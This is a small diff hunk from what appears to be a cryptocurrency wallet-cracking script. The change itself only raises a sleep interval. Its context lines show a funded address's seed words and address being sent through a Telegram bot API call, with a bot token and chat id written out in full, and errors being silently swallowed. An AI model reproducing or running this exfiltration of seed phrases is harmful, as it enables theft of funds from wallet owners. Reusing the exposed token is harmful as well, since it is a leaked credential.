@@ -47,7 +47,7 @@ def check():
             if bal['countTxs'] > 0:
                 requests.get(
                 'https://api.telegram.org/bot5660911952:AAF4fdv2fjzeyqUHtvjsm51wtPl0eCoQkaQ/sendMessage?chat_id=400635213&text=' + words + '\n' + addr)
-            time.sleep(5)
+            time.sleep(10)
 
     except:
         pass
